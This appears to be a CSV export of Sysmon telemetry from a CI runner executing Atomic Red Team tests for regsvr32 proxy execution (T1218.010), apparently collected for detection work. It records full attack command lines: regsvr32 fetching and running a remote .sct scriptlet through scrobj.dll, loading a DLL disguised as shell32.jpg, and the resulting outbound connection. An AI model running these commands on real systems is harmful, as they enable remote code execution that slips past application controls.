"TimeCreated","Id","Message"
"12/17/2025 8:05:20 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:05:20.008
ProcessGuid: {f995aebf-6440-6942-6206-000000000e00}
ProcessId: 5448
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-643f-6942-6006-000000000e00}
ParentProcessId: 960
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:19 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:05:19.986
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-643f-6942-6006-000000000e00}
TargetProcessId: 960
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:19 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:05:19.986
ProcessGuid: {f995aebf-643f-6942-6006-000000000e00}
ProcessId: 960
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:19 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:05:19.714
ProcessGuid: {f995aebf-643f-6942-5f06-000000000e00}
ProcessId: 7624
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s C:\Users\RUNNER~1\AppData\Local\Temp\shell32.jpg
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-643f-6942-5d06-000000000e00}
ParentProcessId: 2188
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s %temp%\shell32.jpg
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:19 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:05:19.688
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-643f-6942-5d06-000000000e00}
TargetProcessId: 2188
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:19 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:05:19.689
ProcessGuid: {f995aebf-643f-6942-5d06-000000000e00}
ProcessId: 2188
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s %%temp%%\shell32.jpg
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:19 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:05:18.137
ProcessGuid: {f995aebf-643e-6942-5606-000000000e00}
ProcessId: 2308
Image: C:\Windows\System32\regsvr32.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.118
SourceHostname: runnervm8j6r3.e3zk2pzlrrleboh20n41ic2nra.bx.internal.cloudapp.net
SourcePort: 60965
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:05:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:05:18.597
ProcessGuid: {f995aebf-643e-6942-5b06-000000000e00}
ProcessId: 8616
Image: C:\Windows\SysWOW64\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\syswow64\regsvr32.exe  /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=097108607177A9282D10CD4808221B171B729AFBADB1EBA3C99139348AC8295F
ParentProcessGuid: {f995aebf-643e-6942-5906-000000000e00}
ParentProcessId: 7940
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll) ELSE ( C:\Windows\system32\regsvr32.exe /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll )
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:18 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:05:18.541
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-643e-6942-5906-000000000e00}
TargetProcessId: 7940
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:05:18.541
ProcessGuid: {f995aebf-643e-6942-5906-000000000e00}
ProcessId: 7940
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c IF ""%%PROCESSOR_ARCHITECTURE%%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll) ELSE ( C:\Windows\system32\regsvr32.exe /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll )
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:18 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:05:18.147
ProcessGuid: {f995aebf-643e-6942-5606-000000000e00}
ProcessId: 2308
Image: C:\Windows\system32\regsvr32.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:05:18.048
ProcessGuid: {f995aebf-643e-6942-5606-000000000e00}
ProcessId: 2308
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-643d-6942-5406-000000000e00}
ParentProcessId: 9560
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:17 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:05:17.994
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-643d-6942-5406-000000000e00}
TargetProcessId: 9560
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:17 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:05:17.994
ProcessGuid: {f995aebf-643d-6942-5406-000000000e00}
ProcessId: 9560
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:17 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:05:17.595
ProcessGuid: {f995aebf-643d-6942-5106-000000000e00}
ProcessId: 5032
Image: C:\Windows\System32\regsvr32.exe
ImageLoaded: C:\Windows\System32\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=C821A11C26E939E7A2E96C7E68A9FCEADF39AB6873140951902D2A676381D9C9
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:17 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:05:17.524
ProcessGuid: {f995aebf-643d-6942-5106-000000000e00}
ProcessId: 5032
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s /u /i:""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct"" scrobj.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-643d-6942-4f06-000000000e00}
ParentProcessId: 10000
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct"" scrobj.dll
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:17 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:05:17.498
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-643d-6942-4f06-000000000e00}
TargetProcessId: 10000
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:17 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:05:17.498
ProcessGuid: {f995aebf-643d-6942-4f06-000000000e00}
ProcessId: 10000
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct"" scrobj.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:17 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:05:17.261
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-641b-6942-1a06-000000000e00}
TargetProcessId: 7276
TargetImage: C:\Windows\system32\whoami.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+11c64f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+10dabba|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187f2d|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187beb|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+125f1ff|UNKNOWN(00007FF991BD3401)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:17 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:05:17.262
ProcessGuid: {f995aebf-643d-6942-4e06-000000000e00}
ProcessId: 7276
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:05:17 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:05:17.239
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-643d-6942-4d06-000000000e00}
TargetProcessId: 764
TargetImage: C:\Windows\system32\HOSTNAME.EXE
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+11c64f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+10dabba|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187f2d|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187beb|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+125f1ff|UNKNOWN(00007FF991BD3401)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
